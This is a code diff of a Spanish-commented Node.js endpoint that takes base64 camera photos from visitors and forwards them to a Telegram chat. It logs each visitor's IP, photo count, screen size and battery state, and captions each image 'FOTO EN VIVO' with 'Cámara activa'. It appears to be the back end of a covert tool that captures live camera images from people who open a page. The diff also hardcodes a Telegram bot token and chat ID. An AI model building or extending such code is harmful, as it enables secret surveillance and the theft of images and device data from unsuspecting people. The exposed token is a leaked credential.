@@ -1,7 +1,5 @@
-const formidable = require('formidable');
-
-// Función para enviar foto a Telegram
-async function sendPhotoToTelegram(photoBuffer, caption, ip) {
+// Función para enviar foto a Telegram usando base64
+async function sendPhotoToTelegram(photoBase64, caption, ip) {
   const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '7532643566:AAF7QyzOjYPOck2ORJdFyZNelL9fETFU-IM';
   const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '12075234';
   
@@ -11,6 +9,9 @@ async function sendPhotoToTelegram(photoBuffer, caption, ip) {
   }
 
   try {
+    // Convertir base64 a buffer
+    const photoBuffer = Buffer.from(photoBase64, 'base64');
+    
     // Crear multipart/form-data manualmente para la foto
     const boundary = '----WebKitFormBoundary' + Math.random().toString(16).substr(2);
     const photoFileName = `photo_${Date.now()}_${ip.replace(/[:.]/g, '-')}.jpg`;
@@ -38,6 +39,8 @@ async function sendPhotoToTelegram(photoBuffer, caption, ip) {
     const postBuffer = Buffer.from(`\r\n--${boundary}--\r\n`, 'utf8');
     const finalBuffer = Buffer.concat([preBuffer, photoBuffer, postBuffer]);
     
+    console.log(`📤 Enviando foto a Telegram (${(photoBuffer.length / 1024).toFixed(2)}KB)...`);
+    
     const photoResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
       method: 'POST',
       headers: {
@@ -50,10 +53,10 @@ async function sendPhotoToTelegram(photoBuffer, caption, ip) {
     const photoResult = await photoResponse.json();
 
     if (photoResponse.ok) {
-      console.log('📸 Foto enviada a Telegram');
+      console.log('✅ Foto enviada a Telegram exitosamente');
       return true;
     } else {
-      console.log('❌ Error enviando foto:', photoResult.description);
+      console.log('❌ Error enviando foto:', photoResult);
       return false;
     }
   } catch (error) {
@@ -71,53 +74,56 @@ module.exports = async (req, res) => {
     // Obtener IP del usuario
     const ip = req.headers['x-forwarded-for'] || 
                req.headers['x-real-ip'] || 
-               req.connection.remoteAddress ||
+               req.connection?.remoteAddress ||
                'unknown';
                
     const timestamp = new Date().toLocaleString('es-ES', { timeZone: 'Europe/Madrid' });
 
-    // Parsear la foto usando formidable
-    const form = formidable({
-      maxFileSize: 10 * 1024 * 1024, // 10MB max para fotos
-      keepExtensions: true
-    });
-
-    const [fields, files] = await form.parse(req);
+    // Parsear JSON body
+    const { photoBase64, photoCount, deviceInfo, timestamp: clientTimestamp } = req.body;
     
-    if (!files.photo || !files.photo[0]) {
-      return res.status(400).json({ status: 'error', message: 'No photo file received' });
+    if (!photoBase64) {
+      return res.status(400).json({ status: 'error', message: 'No photo data received' });
     }
 
-    const photoFile = files.photo[0];
-    const photoBuffer = require('fs').readFileSync(photoFile.filepath);
-    const fileSize = (photoFile.size / 1024).toFixed(2); // KB
+    // Calcular tamaño estimado
+    const estimatedSize = (photoBase64.length * 3) / 4; // Estimación del tamaño decodificado
+    const fileSizeKB = (estimatedSize / 1024).toFixed(2);
 
-    // Información adicional si está disponible
-    let deviceInfo = {};
-    if (fields.deviceInfo && fields.deviceInfo[0]) {
-      try {
-        deviceInfo = JSON.parse(fields.deviceInfo[0]);
-      } catch (e) {
-        console.log('Error parsing device info');
+    // Crear caption para la foto
+    let caption = `📸 FOTO EN VIVO #${photoCount || '?'}
+
+📍 <b>IP:</b> <code>${ip}</code>
+⏰ <b>Hora:</b> ${timestamp}
+📊 <b>Tamaño:</b> ${fileSizeKB}KB
+🎥 <b>Estado:</b> Cámara activa`;
+
+    // Añadir info del dispositivo si está disponible
+    if (deviceInfo && Object.keys(deviceInfo).length > 0) {
+      if (deviceInfo.screenWidth) {
+        caption += `\n📱 <b>Pantalla:</b> ${deviceInfo.screenWidth}x${deviceInfo.screenHeight}`;
+      }
+      if (deviceInfo.battery && deviceInfo.battery !== 'No disponible') {
+        const batteryInfo = typeof deviceInfo.battery === 'object' 
+          ? `${deviceInfo.battery.level} (${deviceInfo.battery.charging ? 'cargando' : 'desconectado'})`
+          : deviceInfo.battery;
+        caption += `\n🔋 <b>Batería:</b> ${batteryInfo}`;
       }
     }
 
-    // Crear caption para la foto
-    const caption = `📸 FOTO EN VIVO - ${timestamp}
-📍 IP: ${ip}
-📊 ${fileSize}KB`;
-
     // Enviar a Telegram
-    const telegramSent = await sendPhotoToTelegram(photoBuffer, caption, ip);
+    const telegramSent = await sendPhotoToTelegram(photoBase64, caption, ip);
 
     // Log
-    console.log(`[${timestamp}] PHOTO_SENT from ${ip} - Size: ${fileSize}KB - Telegram: ${telegramSent ? 'SENT' : 'FAILED'}`);
+    console.log(`[${timestamp}] PHOTO_SENT #${photoCount} from ${ip} - Size: ${fileSizeKB}KB - Telegram: ${telegramSent ? 'SENT' : 'FAILED'}`);
 
     res.json({ 
       status: 'success', 
       message: telegramSent ? 'Foto enviada a Telegram' : 'Error enviando foto',
       telegramSent: telegramSent,
-      timestamp: timestamp
+      photoCount: photoCount,
+      timestamp: timestamp,
+      size: `${fileSizeKB}KB`
     });
 
   } catch (error) {
